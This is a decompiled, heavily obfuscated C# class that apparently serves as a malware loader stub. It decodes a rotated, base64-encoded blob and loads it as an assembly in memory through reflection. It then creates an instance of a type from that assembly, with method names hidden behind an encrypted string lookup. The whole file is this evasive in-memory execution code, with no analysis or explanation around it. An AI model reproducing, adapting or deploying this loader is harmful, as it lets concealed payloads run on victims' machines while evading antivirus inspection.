using System;
using System.Reflection;
using System.Runtime.CompilerServices;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;

internal sealed class Class2
{
	private string string_0;

	private string string_1;

	public Class2(ushort ushort_0, bool bool_0, bool bool_1, string string_2, double double_0)
	{
		string_2 = method_6(string_2);
		byte[] byte_ = Convert.FromBase64CharArray(string_2.ToCharArray(), 0, 58028);
		method_0(byte_);
	}

	public int method_0(byte[] byte_0)
	{
		object objectValue = RuntimeHelpers.GetObjectValue(method_5(AppDomain.CurrentDomain, Class7.smethod_0(-1566192531), byte_0));
		object objectValue2 = RuntimeHelpers.GetObjectValue(method_5(RuntimeHelpers.GetObjectValue(objectValue), Class7.smethod_0(-1566192538), method_3()));
		Versioned.CallByName(RuntimeHelpers.GetObjectValue(objectValue2), Class7.smethod_0(-1566192524), (CallType)1, new object[5]
		{
			method_1(),
			BindingFlags.CreateInstance,
			null,
			null,
			new string[3]
			{
				Class4.string_0,
				Class4.string_1,
				Class7.smethod_0(-1566192551)
			}
		});
		return 2048;
	}

	public string method_1()
	{
		return Class7.smethod_0(-1566192594) + string.Empty + Class7.smethod_0(-1566192579);
	}

	public void method_2(string string_2)
	{
		string_0 = string_2;
	}

	public string method_3()
	{
		return Class7.smethod_0(-1566192632) + string.Empty + Class7.smethod_0(-1566192634);
	}

	public void method_4(string string_2)
	{
		string_1 = string_2;
	}

	public object method_5(object object_0, object object_1, object object_2)
	{
		return Versioned.CallByName(RuntimeHelpers.GetObjectValue(object_0), Conversions.ToString(object_1), (CallType)2, new object[1] { object_2 });
	}

	private string method_6(object object_0)
	{
		object obj = Strings.Len(RuntimeHelpers.GetObjectValue(object_0));
		object obj2 = string.Empty;
		object obj3 = default(object);
		object obj4 = default(object);
		if (ForLoopControl.ForLoopInitObj(obj3, (object)1, obj, (object)1, ref obj4, ref obj3))
		{
			do
			{
				object obj5 = Strings.Asc(Strings.Mid(Conversions.ToString(object_0), Conversions.ToInteger(obj3), 1));
				obj2 = (Conversions.ToBoolean(Operators.AndObject(Operators.CompareObjectGreaterEqual(obj5, (object)33, false), Operators.CompareObjectLessEqual(obj5, (object)126, false))) ? Operators.ConcatenateObject(obj2, typeof(Strings).InvokeMember(Class7.smethod_0(-1566192413), BindingFlags.InvokeMethod, null, null, new object[1] { Operators.AddObject((object)33, Operators.ModObject(Operators.AddObject(obj5, (object)14), (object)94)) })) : Operators.ConcatenateObject(obj2, typeof(Strings).InvokeMember(Class7.smethod_0(-1566192413), BindingFlags.InvokeMethod, null, null, new object[1] { obj5 })));
			}
			while (ForLoopControl.ForNextCheckObj(obj3, obj4, ref obj3));
		}
		return Conversions.ToString(obj2);
	}
}
